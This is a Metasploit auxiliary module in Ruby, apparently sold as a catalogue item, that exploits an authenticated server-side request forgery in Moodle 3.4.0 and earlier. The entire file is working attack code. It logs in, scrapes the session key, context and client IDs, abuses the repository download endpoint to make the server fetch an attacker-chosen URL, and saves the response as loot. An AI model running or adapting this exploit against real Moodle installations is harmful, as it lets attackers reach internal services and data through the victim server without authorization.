##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Moodle Authenticated SSRF',
      'Description'    => %q{
    This module exploits an authenticated server-side request forgery
    vulnerability and returns the body of the response as loot.

    Moodle v3.4.0 and likely prior were vulnerable to an authenticated
    server-side request forgery vulnerability. This was particularly
    unique because Moodle makes the HTTP response body available
    to yu for download. This modules exploits the vulnerability
    and stores the response as loot.

    Categories: Open Source

    Price: 1

    Video: none

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'References'     =>
        [
        ],
      'Author'         =>
        [
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => ''
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The relative URI', '/']),
        OptString.new('USERNAME', [true, 'The username to authenticate with', 'user']),
        OptString.new('PASSWORD', [true, 'The password to authenticate with', 'Passw0rd!']),
        OptString.new('URL', [true, 'The URL to request', 'https://www.google.com'])
      ], self.class)
  end

  def run
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/login/index.php'),
      'method' => 'POST',
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }
    })

    unless res && res.code == 303 && res.headers['Location'] =~ /testsession=\d/
      fail_with(Failure::Unknown, 'Authentication failed')
    end

    cookie = res.get_cookies

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/user/files.php'),
      'cookie' => cookie
    })

    unless res && res.body =~ /"contextid":(\d)/
      fail_with(Failure::Unknown, "Couldn't get context or sess key")
    end

    ctx_id = $1

    unless res && res.body =~ /"sesskey":"(.*?)"/
      fail_with(Failure::Unknown, "Couldn't get a sesskey")
    end

    sesskey = $1

    unless res.body =~ /"client_id":"(.*?)"/
      fail_with(Failure::Unknown, "Couldn't get client id")
    end

    client_id = $1
    name = Rex::Text.rand_text_alpha(8)

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/repository/repository_ajax.php?action=download'),
      'method' => 'POST',
      'vars_post' => {
        'repo_id' => 1,
        'p' => '',
        'page' => '',
        'env' => 'filemanager',
        'sesskey' => sesskey,
        'client_id' => client_id,
        'itemid' => '',
        'maxbytes' => -1,
        'areamaxbytes' => -1,
        'ctx_id' => ctx_id,
        'title' => name,
        'source' => datastore['URL'],
        'savepath' => '/',
        'license' => 'cc-sa',
        'author' => Rex::Text.rand_text_alpha(10)
      },
      'cookie' => cookie
    })

    uri = '/'+ JSON.parse(res.body)['url'].split('/')[3..-1].join('/')

    res = send_request_cgi({
      'uri' => uri,
      'cookie' => cookie
    })

    path = store_loot('moodle.ssrf_body', 'text/plain', datastore['RHOST'], res.body)

    print_good("Response body saved to file: " + path)
  end
end

